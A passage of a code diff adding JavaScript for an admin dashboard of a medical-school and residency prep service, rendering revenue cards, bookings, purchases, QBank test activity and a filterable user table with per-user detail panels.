+      return ms ? new Date(ms).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) : '—';
+    }
+    function kindChip(kind) {
+      const label = SHOSCatalog.KIND_LABELS[kind] || kind;
+      return `<span class="aa-chip aa-chip-${escapeAttr(kind)}">${escapeHtml(label)}</span>`;
+    }
+    function statusChip(status) {
+      const cls = { 'Paid': 'paid', 'Partially refunded': 'partial', 'Refunded': 'refunded',
+        'Test mode': 'test', 'No charge': 'test', 'Not paid': 'test' }[status] || 'test';
+      return `<span class="aa-status aa-status-${cls}">${escapeHtml(status)}</span>`;
+    }
+    function accessBadge(access) {
+      const cls = { purchased: 'purchased', complimentary: 'comp', staff: 'staff', none: 'none' }[access.state] || 'none';
+      return `<span class="aa-access aa-access-${cls}" title="${escapeAttr(access.state === 'complimentary'
+        ? 'Granted by an admin. Not a purchase and not revenue.' : access.label)}">${escapeHtml(access.label)}</span>`;
+    }
+
+    // Rebuild the per-person records from the latest users + ledger.
+    function refreshAdminPeople() {
+      const users = Array.isArray(allAdminUsers) ? allAdminUsers : [];
+      adminPeople = SHOSAdmin.buildPeople(users, window._latestTransactions || [], ADMIN_AUDIENCE_CFG);
+      const byId = {};
+      adminPeople.forEach(p => { byId[p.id] = p; });
+      window._adminPeopleById = byId;
+      return adminPeople;
+    }
+
+    function adminDataState() {
+      const usersReady = Array.isArray(allAdminUsers) && allAdminUsers.length > 0;
+      return {
+        usersReady,
+        usersError: window._adminUsersError || null,
+        ledgerReady: window._transactionsLoaded === true,
+        ledgerError: window._transactionsError || null,
+      };
+    }
+
+    // ---------------------------------------------------------- view switch
+    function setAdminView(view) {
+      if (!SHOSAdmin.VIEWS.includes(view)) view = 'overview';
+      adminView = view;
+      adminStore('shosAdminView', view);
+      document.querySelectorAll('.admin-audience-btn').forEach(b => {
+        const on = b.dataset.adminView === view;
+        b.classList.toggle('active', on);
+        b.setAttribute('aria-pressed', on ? 'true' : 'false');
+      });
+      const meta = ADMIN_VIEW_META[view];
+      const banner = document.getElementById('adminAudienceBanner');
+      if (banner) banner.dataset.view = view;
+      const nameEl = document.getElementById('adminAudienceName');
+      if (nameEl) nameEl.textContent = meta.name;
+      const subEl = document.getElementById('adminViewSub');
+      if (subEl) subEl.textContent = meta.sub;
+      document.querySelectorAll('#viewAdmin [data-admin-views]').forEach(el => {
+        el.hidden = !el.dataset.adminViews.split(' ').includes(view);
+      });
+      // Filter options differ per view; reset to "all" on switch so a
+      // filter from another view can never silently hide people.
+      const sel = document.getElementById('adminUserFilter');
+      if (sel) {
+        sel.innerHTML = SHOSAdmin.FILTERS[view].map(([v, l]) => `<option value="${v}">${escapeHtml(l)}</option>`).join('');
+        sel.value = 'all';
+      }
+      ['inboxAudienceFilter', 'bookingAudienceFilter'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.value = 'all';
+      });
+      const title = document.getElementById('adminUsersTitle');
+      if (title) title.textContent = meta.people;
+      renderAdminAudience();
+      if (typeof paintInbox === 'function') paintInbox();
+      if (typeof paintBookings === 'function') paintBookings();
+      if (typeof paintCalendar === 'function') paintCalendar();
+      if (view === 'med-school') loadQbankUsage();
+    }
+
+    function initAdminAudienceControls() {
+      if (window._adminAudienceBound) return;
+      window._adminAudienceBound = true;
+      document.querySelectorAll('.admin-audience-btn').forEach(b =>
+        b.addEventListener('click', () => setAdminView(b.dataset.adminView)));
+      const period = document.getElementById('adminPeriodSelect');
+      if (period) {
+        period.value = adminPeriod;
+        period.addEventListener('change', () => {
+          adminPeriod = SHOSAdmin.PERIODS[period.value] ? period.value : 'all';
+          adminStore('shosAdminPeriod', adminPeriod);
+          renderAdminAudience();
+        });
+      }
+      setAdminView(adminView);
+    }
+
+    // ------------------------------------------------------ main render
+    function renderAdminAudience() {
+      const st = adminDataState();
+      if (st.usersReady) refreshAdminPeople();
+      renderAdminCards(st);
+      renderAdminDefinitions();
+      renderAdminAttention(st);
+      renderAdminUpcoming();
+      renderAdminPurchases(st);
+      renderAdminServices(st);
+      renderAdminSignups(st);
+      if (st.usersReady) {
+        applyAdminUserFilters();
+        renderAdminUsersPage();
+      }
+      if (adminView === 'med-school') {
+        if (st.usersReady && !window._qbankUsage) loadQbankUsage();
+        else renderRecentTests();
+      }
+    }
+    window.renderAdminAudience = renderAdminAudience;
+
+    function revenueOpts() {
+      return { period: adminPeriod, nowMs: adminNow(), excludeEmails: ADMIN_AUDIENCE_CFG.adminEmails };
+    }
+
+    function card(label, value, subs, opts) {
+      const o = opts || {};
+      return `<div class="admin-card${o.state ? ' is-' + o.state : ''}${o.accent ? ' admin-card-accent' : ''}">
+        <div class="admin-card-label">${escapeHtml(label)}</div>
+        <div class="admin-card-value"${o.id ? ` id="${o.id}"` : ''}>${value}</div>
+        ${(subs || []).filter(Boolean).map(s => `<div class="admin-card-sub">${s}</div>`).join('')}
+      </div>`;
+    }
+
+    function renderAdminCards(st) {
+      const el = document.getElementById('adminCards');
+      if (!el) return;
+      const periodLabel = SHOSAdmin.PERIODS[adminPeriod].label;
+      const titleEl = document.getElementById('adminCardsTitle');
+      if (titleEl) titleEl.textContent = 'Summary · ' + ADMIN_VIEW_META[adminView].name;
+
+      if (st.usersError) {
+        el.innerHTML = card('People', '—', ['Couldn\'t load the user list: ' + escapeHtml(st.usersError) + '. Refresh the page to try again.'], { state: 'error' });
+        return;
+      }
+      if (!st.usersReady) {
+        el.innerHTML = ['Applicants', 'Paying customers', 'Revenue'].map(l => card(l, '…', ['Loading'], { state: 'loading' })).join('');
+        return;
+      }
+      const s = SHOSAdmin.viewStats(adminView, adminPeople, window._latestTransactions || [], revenueOpts());
+      const monthStart = SHOSAdmin.periodStart('month', adminNow());
+      const newThisMonth = adminPeople.filter(p => SHOSAdmin.inView(p, adminView) && (p.createdAtMs || 0) >= monthStart).length;
+      const cards = [];
+      cards.push(card(adminView === 'overview' ? 'Applicants' : ADMIN_VIEW_META[adminView].people, s.applicants.toLocaleString(), [
+        `${newThisMonth} new this month`,
+        adminView === 'overview' ? `${s.notSelected} haven't chosen a path · ${s.staff} staff not counted` : null,
+      ]));
+      if (st.ledgerError) {
+        const why = 'Payment records unavailable (' + escapeHtml(st.ledgerError) + ').';
+        cards.push(card('Paying customers', '—', [why], { state: 'error' }));
+        cards.push(card('Revenue', '—', [why], { state: 'error' }));
+      } else if (!st.ledgerReady) {
+        cards.push(card('Paying customers', '…', ['Loading payment records'], { state: 'loading' }));
+        cards.push(card('Revenue', '…', ['Loading payment records'], { state: 'loading' }));
+      } else {
+        const r = s.revenue;
+        cards.push(card('Paying customers', r.payingCustomers.toLocaleString(), [
+          periodLabel,
+          adminView === 'overview' ? 'each person counted once' : null,
+        ]));
+        const subs = [periodLabel + ' · after refunds'];
+        if (adminView === 'overview') {
+          subs.push(`Med School ${money(r.subtotals['med-school'])} · Residency ${money(r.subtotals.residency)}`);
+          if (r.subtotals.unclassified) subs.push(`<span class="aa-warn">Unclassified ${money(r.subtotals.unclassified)}</span>`);
+        }
+        if (r.refundedCents) subs.push(`Refunds deducted: ${money(r.refundedCents)}`);
+        const other = Object.keys(r.revenueByCurrency).filter(c => c !== 'usd');
+        if (other.length) subs.push('Plus ' + other.map(c => money(r.revenueByCurrency[c], c)).join(', ') + ' (not converted)');
+        cards.push(card('Revenue', money(r.revenueCents), subs, { accent: true }));
+      }
+      if (adminView === 'residency') {
+        const n = st.ledgerReady && !st.ledgerError ? s.revenue.transactionsCounted : null;
+        cards.push(card('Services sold', n == null ? '—' : n.toLocaleString(), [periodLabel + ' · not fully refunded']));
+      }
+      if (s.qbank) {
+        cards.push(card('QBank access', (s.qbank.purchased + s.qbank.complimentary).toLocaleString(), [
+          `${s.qbank.purchased} purchased · ${s.qbank.complimentary} complimentary`, 'who can use it now',
+        ]));
+      }
+      if (adminView === 'med-school') {
+        const u = window._qbankUsage;
+        let v = '…', sub = ['Loading test history'], state = 'loading';
+        if (u && u.error) { v = '—'; sub = ['Couldn\'t load test history']; state = 'error'; }
+        else if (u && u.loaded) { v = u.takers.length.toLocaleString(); sub = ['completed a QBank test', 'in the last 30 days']; state = null; }
+        cards.push(card('Recent QBank activity', v, sub, { state }));
+      }
+      if (adminView === 'overview') {
+        const visits = typeof window._siteVisits === 'number' ? window._siteVisits.toLocaleString() : '…';
+        cards.push(card('Site visits', visits, ['site-wide, all time', 'anonymous visitors only'], { id: 'adminStatVisits' }));
+      }
+      el.innerHTML = cards.join('');
+    }
+
+    function renderAdminDefinitions() {
+      const el = document.getElementById('adminDefinitionsBody');
+      if (!el) return;
+      const period = SHOSAdmin.PERIODS[adminPeriod].label.toLowerCase();
+      const rows = [
+        ['Applicants', adminView === 'overview'
+          ? 'Every account except staff and reviewers. People appear in an audience view when they chose that path, bought from that audience, or (Med School) have QBank access. Someone who fits both appears in both views but only once here.'
+          : 'Accounts in this audience: they chose this path, or bought something from this audience' + (adminView === 'med-school' ? ', or have QBank access.' : '.')],
+        ['Paying customers', 'People with at least one real (live) Stripe payment ' + (adminView === 'overview' ? '' : 'for this audience ') + 'made in the selected period (' + period + ') that has not been fully refunded. Complimentary access and staff purchases never count.'],
+        ['Revenue', 'The amount Stripe actually collected, in US dollars, minus refunds — never today\'s advertised prices. A payment belongs to the period in which it was made; if it is refunded later, the refund is subtracted from that same period, so an older period can go down after a refund.'],
+      ];
+      if (adminView !== 'residency') {
+        rows.push(['QBank access', 'Who can use the QBank right now. "Purchased" came from a Stripe payment; "Complimentary" was granted by an admin and is not revenue. Access is separate from payment: a refund does not switch access off automatically.']);
+      }
+      if (adminView === 'med-school') {
+        rows.push(['Recent QBank activity', 'People in this audience who completed at least one QBank test in the last 30 days. Only completed tests are recorded, so browsing without finishing a test does not count.']);
+      }
+      if (adminView === 'overview') {
+        rows.push(['Site visits', 'Site-wide visit counter for anonymous (signed-out) visitors only. It is not split by audience because visits are not tagged with one.']);
+      }
+      el.innerHTML = '<dl>' + rows.map(([t, d]) => `<dt>${escapeHtml(t)}</dt><dd>${escapeHtml(d)}</dd>`).join('') + '</dl>';
+    }
+
+    function emptyLine(text) { return `<div class="admin-empty-msg">${escapeHtml(text)}</div>`; }
+
+    function renderAdminAttention(st) {
+      const el = document.getElementById('adminAttention');
+      if (!el) return;
+      if (!st.usersReady) { el.innerHTML = '<div class="admin-loading">Loading…</div>'; return; }
+      const items = SHOSAdmin.attentionItems({
+        view: adminView, people: adminPeople, transactions: window._latestTransactions || [],
+        messages: window._adminMessages || [], bookings: window._adminBookings || [],
+        openReports: window._openReportsCount || 0,
+      });
+      const pending = [];
+      if (!window._adminMessagesLoaded) pending.push('messages');
+      if (!window._adminBookingsLoaded) pending.push('bookings');
+      if (!items.length) {
+        el.innerHTML = emptyLine(pending.length ? 'Still loading ' + pending.join(' and ') + '…' : 'Nothing needs attention right now.');
+        return;
+      }
+      el.innerHTML = items.map(i => `<button type="button" class="aa-attn" data-target="${escapeAttr(i.target || '')}"${i.target ? '' : ' disabled'}>
+          <span class="aa-attn-count">${i.count}</span><span class="aa-attn-label">${escapeHtml(i.label)}</span>${i.target ? '<span class="aa-attn-go" aria-hidden="true">›</span>' : ''}
+        </button>`).join('');
+      el.querySelectorAll('.aa-attn[data-target]').forEach(b => b.addEventListener('click', () => adminGoTo(b.dataset.target)));
+    }
+
+    function adminGoTo(target) {
+      if (!target) return;
+      if (target === 'inbox' || target === 'bookings') {
+        const tab = document.querySelector('.admin-tab[data-admin-tab="' + target + '"]');
+        if (tab) tab.click();
+      } else if (target.startsWith('view:')) {
+        setAdminView(target.slice(5));
+        const r = document.getElementById('adminReportsSection');
+        if (r) r.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      } else if (target === 'reports') {
+        const r = document.getElementById('adminReportsSection');
+        if (r) r.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      } else if (target.startsWith('filter:')) {
+        const sel = document.getElementById('adminUserFilter');
+        if (sel) { sel.value = target.slice(7); sel.dispatchEvent(new Event('change')); }
+        const s = document.getElementById('adminUsersSection');
+        if (s) s.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    }
+
+    function renderAdminUpcoming() {
+      const el = document.getElementById('adminUpcoming');
+      if (!el) return;
+      if (!window._adminBookingsLoaded) {
+        el.innerHTML = window._adminBookingsError ? emptyLine('Couldn\'t load bookings.') : '<div class="admin-loading">Loading…</div>';
+        return;
+      }
+      const list = SHOSAdmin.upcomingBookings(window._adminBookings || [], adminView, adminNow(), 14);
+      if (!list.length) { el.innerHTML = emptyLine('No open bookings in the next 14 days.'); return; }
+      el.innerHTML = list.slice(0, 8).map(b => {
+        const cls = SHOSCatalog.bookingAudience(b);
+        const when = new Date(b._dateMs).toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
+        return `<div class="aa-row">
+          <div class="aa-row-main"><strong>${escapeHtml(b.serviceName || SHOSCatalog.productName(b.serviceType))}</strong>
+            ${adminView === 'overview' ? kindChip(cls.kind) : ''}
+            <div class="aa-row-meta">${escapeHtml(b.name || '')}${b.email ? ' · ' + escapeHtml(b.email) : ''}</div></div>
+          <div class="aa-row-side"><div>${escapeHtml(when)}${b.preferredTime ? ' · ' + escapeHtml(b.preferredTime) : ''}</div>
+            <span class="status-badge status-${escapeAttr(b.status)}">${escapeHtml(String(b.status).replace('_', ' '))}</span></div>
+        </div>`;
+      }).join('') + (list.length > 8 ? `<div class="aa-more">+${list.length - 8} more in the Calendar tab</div>` : '');
+    }
+
+    function ledgerNotReady(el, st) {
+      if (st.ledgerError) { el.innerHTML = emptyLine('Payment records unavailable (' + st.ledgerError + ').'); return true; }
+      if (!st.ledgerReady || !st.usersReady) { el.innerHTML = '<div class="admin-loading">Loading…</div>'; return true; }
+      return false;
+    }
+
+    function renderAdminPurchases(st) {
+      const el = document.getElementById('adminRecentPurchases');
+      if (!el || ledgerNotReady(el, st)) return;
+      const list = SHOSAdmin.recentPurchases(adminPeople, window._latestTransactions || [], adminView, 8);
+      if (!list.length) { el.innerHTML = emptyLine('No purchases yet' + (adminView === 'overview' ? '.' : ' in this audience.')); return; }
+      el.innerHTML = list.map(p => {
+        const who = p.person ? (p.person.name || p.person.email) : (p.email || 'Unknown customer');
+        const amount = p.amountRefunded
+          ? `<s>${escapeHtml(money(p.amountTotal, p.currency))}</s> ${escapeHtml(money(p.netCents, p.currency))}`
+          : escapeHtml(money(p.amountTotal, p.currency));
+        return `<div class="aa-row">
+          <div class="aa-row-main"><strong>${escapeHtml(p.name)}</strong> ${adminView === 'overview' ? kindChip(p.kind) : ''}
+            <div class="aa-row-meta">${escapeHtml(who)} · ${escapeHtml(shortDate(p.purchasedAtMs))}</div></div>
+          <div class="aa-row-side"><div class="aa-amount">${amount}</div>${statusChip(p.status)}</div>
+        </div>`;
+      }).join('');
+    }
+
+    function renderAdminServices(st) {
+      const el = document.getElementById('adminServices');
+      const pEl = document.getElementById('adminServicesPeriod');
+      if (pEl) pEl.textContent = SHOSAdmin.PERIODS[adminPeriod].label.toLowerCase() + ' · after refunds';
+      const tEl = document.getElementById('adminServicesTitle');
+      if (tEl && tEl.firstChild) tEl.firstChild.textContent = adminView === 'residency' ? 'Purchased services ' : 'Sales by product ';
+      if (!el || ledgerNotReady(el, st)) return;
+      const staffIds = adminPeople.filter(p => p.role !== 'applicant').map(p => p.id);
+      const rows = SHOSAdmin.servicesBreakdown(window._latestTransactions || [], adminView,
+        Object.assign(revenueOpts(), { excludeUids: staffIds }));
+      if (!rows.length) { el.innerHTML = emptyLine('Nothing sold in this period.'); return; }
+      el.innerHTML = `<table class="aa-mini-table"><thead><tr><th>Product / service</th><th class="num">Sold</th><th class="num">Revenue</th></tr></thead><tbody>` +
+        rows.map(r => `<tr><td>${escapeHtml(r.name)} ${adminView === 'overview' || r.kind === 'unclassified' ? kindChip(r.kind) : ''}</td>
+          <td class="num">${r.count}</td><td class="num">${escapeHtml(money(r.netCents, r.currency))}</td></tr>`).join('') +
+        '</tbody></table>';
+    }
+
+    function renderAdminSignups(st) {
+      const el = document.getElementById('adminRecentSignups');
+      if (!el) return;
+      if (!st.usersReady) { el.innerHTML = '<div class="admin-loading">Loading...</div>'; return; }
+      const list = adminPeople.filter(p => SHOSAdmin.inView(p, adminView))
+        .sort((a, b) => (b.createdAtMs || 0) - (a.createdAtMs || 0)).slice(0, 10);
+      if (!list.length) { el.innerHTML = emptyLine('No sign-ups yet.'); return; }
+      el.innerHTML = list.map(p => `<div class="admin-activity-item">
+          <div>${escapeHtml(p.name || '(no name)')} <span class="aa-path">${escapeHtml(p.derivedPath)}</span></div>
+          <div class="admin-activity-meta">${escapeHtml(p.email)} &middot; ${escapeHtml(shortDate(p.createdAtMs))}</div>
+        </div>`).join('');
+    }
+
+    // ------------------------------------------------ QBank usage (Med)
+    // Reads each med-school applicant's QBank history (one read per person),
+    // at most once every 5 minutes. Feeds the "Recent QBank activity" card
+    // and the "Recent QBank tests" list.
+    async function loadQbankUsage(force) {
+      const u = window._qbankUsage;
+      if (!force && u && (u.loading || (u.loaded && Date.now() - u.loadedAt < 5 * 60 * 1000))) return;
+      if (!adminPeople.length) return;   // retried from renderAdminAudience once users load
+      window._qbankUsage = { loading: true };
+      const members = adminPeople.filter(p => SHOSAdmin.inView(p, 'med-school'));
+      const histories = {};
+      const tests = [];
+      try {
+        const queue = members.slice();
+        async function worker() {
+          while (queue.length) {
+            const p = queue.shift();
+            try {
+              const doc = await db.collection('users').doc(p.id).collection('qbankData').doc('history').get();
+              const list = doc.exists ? (doc.data().tests || []) : [];
+              histories[p.id] = list;
+              list.forEach(t => tests.push(Object.assign({}, t, { _who: p.name || p.email || 'Unknown' })));
+            } catch (_) { histories[p.id] = []; }
+          }
+        }
+        await Promise.all(Array.from({ length: 8 }, worker));
+        tests.sort((a, b) => (SHOSAdmin.toMs(b.date) || 0) - (SHOSAdmin.toMs(a.date) || 0));
+        window._qbankUsage = { loaded: true, loadedAt: Date.now(), takers: SHOSAdmin.recentTestTakers(histories, Date.now()), tests: tests.slice(0, 10) };
+      } catch (err) {
+        console.error('[admin] QBank usage load failed:', err);
+        window._qbankUsage = { error: true, loadedAt: Date.now() };
+      }
+      renderAdminCards(adminDataState());
+      renderRecentTests();
+    }
+
+    function renderRecentTests() {
+      const el = document.getElementById('adminRecentTests');
+      if (!el) return;
+      const u = window._qbankUsage;
+      if (!u || u.loading) { el.innerHTML = '<div class="admin-loading">Loading...</div>'; return; }
+      if (u.error) { el.innerHTML = emptyLine('Could not load tests.'); return; }
+      if (!u.tests.length) { el.innerHTML = emptyLine('No tests yet.'); return; }
+      el.innerHTML = u.tests.map(t => {
+        const pct = t.total > 0 ? Math.round((t.correct / t.total) * 100) : 0;
+        const ms = SHOSAdmin.toMs(t.date);
+        return `<div class="admin-activity-item">
+          <div>${escapeHtml(t._who)} - ${pct}% (${t.correct}/${t.total})</div>
+          <div class="admin-activity-meta">${ms ? new Date(ms).toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) : ''}</div>
+        </div>`;
+      }).join('');
+    }
+
+    // ------------------------------------------------ people table
+    function applyAdminUserFilters() {
+      const q = (document.getElementById('adminUserSearch') || {}).value || '';
+      const f = (document.getElementById('adminUserFilter') || {}).value || 'all';
+      if (!adminPeople.length && Array.isArray(allAdminUsers) && allAdminUsers.length) refreshAdminPeople();
+      const people = SHOSAdmin.filterPeople(adminPeople, adminView, { query: q, filter: f });
+      filteredAdminUsers = people.map(p => p.raw);
+      window._adminFilteredPeople = people;
+      const totalPages = Math.max(1, Math.ceil(filteredAdminUsers.length / ADMIN_PAGE_SIZE));
+      if (adminCurrentPage > totalPages) adminCurrentPage = 1;
+      const cap = document.getElementById('adminUsersCaption');
+      if (cap) {
+        const base = SHOSAdmin.filterPeople(adminPeople, adminView, { filter: f === 'staff' ? 'staff' : 'all' }).length;
+        cap.textContent = people.length === base
+          ? `${people.length} ${people.length === 1 ? 'person' : 'people'}`
+          : `Showing ${people.length} of ${base}`;
+      }
+    }
+    window.applyAdminUserFilters = applyAdminUserFilters;
+
+    function adminTableColumns() {
+      if (adminView === 'med-school') return ['Person', 'Path', 'Signed up', 'Med School purchases', 'QBank Access', 'Actions'];
+      if (adminView === 'residency') return ['Person', 'Path', 'Signed up', 'Purchased services', 'Actions'];
+      return ['Person', 'Path', 'Signed up', 'Purchases', 'Visits', 'Actions'];
+    }
+
+    function purchasesCell(person) {
+      const list = SHOSAdmin.purchasesInView(person, adminView).filter(p => p.status !== 'Test mode');
+      if (!list.length) return '<span class="aa-muted">No purchases</span>';
+      return list.map(p => `<div class="aa-purchase">${escapeHtml(p.name)} — ${statusChip(p.status)}</div>`).join('');
+    }
+
+    function pathCell(person) {
+      if (person.role === 'admin') return '<span class="admin-badge admin-badge-admin" title="Admin (access to both paths)">Admin</span>';
+      if (person.role === 'reviewer') return '<span class="admin-badge admin-badge-reviewer" title="QBank reviewer">Reviewer</span>';
+      const cls = person.derivedPath === 'Both' ? 'both'
+        : person.audiences['med-school'] ? 'applicant' : person.audiences.residency ? 'student' : 'none';
+      const tip = 'Chosen path: ' + person.pathLabel + (person.derivedPath !== person.pathLabel ? ' · shown as "' + person.derivedPath + '" because of purchases or access' : '');
+      return `<span class="admin-badge aa-path-${cls}" title="${escapeAttr(tip)}">${escapeHtml(person.derivedPath)}</span>`;
+    }
+
+    function renderAdminUsersPage() {
+      const head = document.getElementById('adminUsersHead');
+      const tbody = document.getElementById('adminUsersBody');
+      if (!tbody) return;
+      // Live data redraws the table often (e.g. a visit-count tick); keep
+      // any Details panels the admin has open.
+      const openDetails = Array.from(tbody.querySelectorAll('tr.admin-details-row'))
+        .map(r => r.previousElementSibling && r.previousElementSibling.dataset.uid).filter(Boolean);
+      const cols = adminTableColumns();
+      if (head) head.innerHTML = '<tr>' + cols.map(c => `<th>${escapeHtml(c)}</th>`).join('') + '</tr>';
+      const start = (adminCurrentPage - 1) * ADMIN_PAGE_SIZE;
+      const pageUsers = filteredAdminUsers.slice(start, start + ADMIN_PAGE_SIZE);
+      if (pageUsers.length === 0) {
+        const q = (document.getElementById('adminUserSearch') || {}).value;
+        tbody.innerHTML = `<tr><td colspan="${cols.length}" class="aa-table-empty">${q ? 'No one matches that search in this view.' : 'No one in this view yet.'}</td></tr>`;
+        document.getElementById('adminPagination').innerHTML = '';
+        return;
+      }
+      tbody.innerHTML = pageUsers.map(u => {
+        const p = window._adminPeopleById[u.id];
+        if (!p) return '';
+        const name = p.name || '(no name)';
+        const cells = [
+          `<td class="aa-person"><div class="aa-name">${escapeHtml(name)}${p.hasFirestoreDoc ? '' : ' <span class="aa-muted" title="Sign-in account without a profile record yet">(no profile)</span>'}</div><div class="aa-email">${escapeHtml(p.email || '-')}</div></td>`,
+          `<td>${pathCell(p)}</td>`,
+          `<td style="white-space:nowrap;">${escapeHtml(shortDate(p.createdAtMs))}</td>`,
+          `<td>${purchasesCell(p)}</td>`,
+        ];
+        if (adminView === 'med-school') cells.push(`<td>${accessBadge(p.access)}</td>`);
+        if (adminView === 'overview') cells.push(`<td style="text-align:center;">${p.visitCount > 0 ? `<span style="font-weight:600; color:#0f172a;">${p.visitCount}</span>` : '<span style="color:#cbd5e1;">0</span>'}</td>`);
+        let actions = '';
+        if (adminView === 'med-school' && p.role === 'applicant') {
+          const has = p.raw.payments && p.raw.payments['exam-bank'] === 'paid';
+          actions += `<button class="admin-action-btn ${has ? 'admin-btn-revoke' : 'admin-btn-grant'}" onclick="toggleQBankAccess('${escapeJs(p.id)}', ${has})" title="${has ? 'Switch QBank access off' : 'Give complimentary QBank access (not a purchase, not revenue)'}">${has ? 'Revoke' : 'Grant'}</button>`;
+        }
+        actions += `<button class="admin-action-btn admin-btn-details" onclick="toggleUserDetails('${escapeJs(p.id)}', this)">Details</button>`;
+        actions += `<a class="admin-action-btn" style="background:#F1F5F9; color:#0F172A; border-color:#CBD5E1;" title="Open the dashboard exactly as this user sees it" href="dashboard.html?viewAs=${encodeURIComponent(p.id)}">View as</a>`;
+        cells.push(`<td class="aa-actions">${actions}</td>`);
+        return `<tr data-uid="${escapeAttr(p.id)}">${cells.join('')}</tr>`;
+      }).join('');
+      renderAdminPagination();
+      openDetails.forEach(uid => {
+        const btn = tbody.querySelector('tr[data-uid="' + CSS.escape(uid) + '"] .admin-btn-details');
+        if (btn) toggleUserDetails(uid, btn);
+      });
+    }
+
+    // ------------------------------------------------ user details
+    function toggleUserDetails(uid, btn) {
+      const row = btn ? btn.closest('tr') : document.querySelector('tr[data-uid="' + uid + '"]');
+      if (!row) return;
+      const existing = row.nextElementSibling;
+      if (existing && existing.classList.contains('admin-details-row')) { existing.remove(); return; }
+      const p = window._adminPeopleById[uid];
+      if (!p) return;
+      const u = p.raw;
+      const detailsRow = document.createElement('tr');
+      detailsRow.className = 'admin-details-row';
+      const td = document.createElement('td');
+      td.colSpan = adminTableColumns().length;
+      td.className = 'admin-user-details';
+
+      const roleLabel = { admin: 'Administrator', reviewer: 'Reviewer', applicant: 'Applicant' }[p.role];
+      let pathHtml = escapeHtml(p.pathLabel);
+      if (p.role === 'applicant') {
+        const on = v => (u.path === v ? ' aa-toggle-on' : '');
+        pathHtml += `<span class="aa-inline-actions">
+          <button class="admin-action-btn${on('applicant')}" onclick="adminSetUserPath('${escapeJs(uid)}', 'applicant')">Med School</button>
+          <button class="admin-action-btn${on('student')}" onclick="adminSetUserPath('${escapeJs(uid)}', 'student')">Residency</button>
+          ${u.path ? `<button class="admin-action-btn" onclick="adminSetUserPath('${escapeJs(uid)}', null)">Clear</button>` : ''}
+        </span>`;
+      }
+      const audiences = [p.audiences['med-school'] && 'Med School', p.audiences.residency && 'Residency'].filter(Boolean).join(' + ') || 'None yet (Overview only)';
+
+      const purchases = p.purchases.length
+        ? `<table class="aa-mini-table"><thead><tr><th>Product / service</th><th>Audience</th><th>Date</th><th class="num">Paid</th><th class="num">Refunded</th><th>Status</th></tr></thead><tbody>` +
+          p.purchases.map(x => `<tr><td>${escapeHtml(x.name)}</td><td>${kindChip(x.kind)}</td><td>${escapeHtml(shortDate(x.purchasedAtMs))}</td>
+            <td class="num">${escapeHtml(money(x.amountTotal, x.currency))}</td><td class="num">${x.amountRefunded ? escapeHtml(money(x.amountRefunded, x.currency)) : '—'}</td>
+            <td>${statusChip(x.status)}</td></tr>`).join('') + '</tbody></table>'
+        : '<span class="aa-muted">No purchases recorded.</span>';
+
+      let accessHtml = '';
+      const showAccess = adminView !== 'residency' || p.access.state !== 'none';
+      if (showAccess) {
+        let btnHtml = '';
+        if (p.role === 'applicant' && adminView !== 'residency') {
+          const has = u.payments && u.payments['exam-bank'] === 'paid';
+          btnHtml = `<button class="admin-action-btn ${has ? 'admin-btn-revoke' : 'admin-btn-grant'}" onclick="toggleQBankAccess('${escapeJs(uid)}', ${has})">${has ? 'Revoke QBank access' : 'Grant complimentary QBank access'}</button>`;
+        }
+        accessHtml = `<div class="aa-detail-block"><h5>Access</h5>
+          <div class="aa-kv"><span>QBank</span><span>${accessBadge(p.access)} ${btnHtml}</span></div>
+          <p class="aa-note">Access is separate from payment. A complimentary grant is not a purchase and does not count as revenue.</p></div>`;
+      }
+
+      const bookings = (window._adminBookings || []).filter(b =>
+        (b.userId && b.userId === uid) || (p.email && String(b.email || '').toLowerCase() === p.email.toLowerCase()));
+      const bookingsHtml = bookings.length
+        ? bookings.map(b => `<div class="aa-row aa-row-compact"><div class="aa-row-main"><strong>${escapeHtml(b.serviceName || SHOSCatalog.productName(b.serviceType))}</strong>
+            <div class="aa-row-meta">${b.preferredDate ? 'Preferred ' + escapeHtml(b.preferredDate) : 'No date requested'}</div></div>
+            <span class="status-badge status-${escapeAttr(b.status)}">${escapeHtml(String(b.status).replace('_', ' '))}</span></div>`).join('')
+        : `<span class="aa-muted">${window._adminBookingsLoaded ? 'No bookings.' : 'Loading bookings…'}</span>`;
+
+      const lastVisit = u.lastVisitAt ? new Date(u.lastVisitAt.toDate ? u.lastVisitAt.toDate() : u.lastVisitAt).toLocaleString() : null;
+      const extra = [];
+      if (u.examDate) extra.push(`<div class="aa-kv"><span>Exam date</span><span>${escapeHtml(String(u.examDate))}</span></div>`);
+      if (u.matchDate) extra.push(`<div class="aa-kv"><span>Match date</span><span>${escapeHtml(String(u.matchDate))}</span></div>`);
+      if (u.residencyProgress) extra.push(`<div class="aa-kv"><span>Residency progress</span><span>${escapeHtml(Object.entries(u.residencyProgress).map(([k, v]) => k + ': ' + v).join(', '))}</span></div>`);
+
+      td.innerHTML = `<div class="aa-details">
+        <div class="aa-detail-block"><h5>Account</h5>
+          <div class="aa-kv"><span>Role</span><span>${escapeHtml(roleLabel)}</span></div>
+          <div class="aa-kv"><span>Chosen path</span><span>${pathHtml}</span></div>
+          <div class="aa-kv"><span>Appears in</span><span>${escapeHtml(audiences)}</span></div>
+          <div class="aa-kv"><span>Signed up</span><span>${escapeHtml(shortDate(p.createdAtMs))}</span></div>
+          <div class="aa-kv"><span>Site visits</span><span>${p.visitCount}${lastVisit ? ' · last ' + escapeHtml(lastVisit) : ''}</span></div>
+          ${extra.join('')}
+          ${p.hasFirestoreDoc ? '' : '<p class="aa-note aa-warn">Sign-in account without a profile record yet (fills in on their next visit).</p>'}
+        </div>
+        <div class="aa-detail-block"><h5>Bookings</h5>${bookingsHtml}</div>
+        <div class="aa-detail-block aa-detail-wide"><h5>Purchases</h5>${purchases}</div>
+        ${accessHtml}
+        <details class="aa-detail-block aa-technical"><summary>Technical details</summary>
+          <div class="aa-kv"><span>User ID</span><span><code>${escapeHtml(uid)}</code></span></div>
+          <div class="aa-kv"><span>Raw payment fields</span><span><code>${escapeHtml(JSON.stringify(u.payments || {}))}</code></span></div>
+        </details>
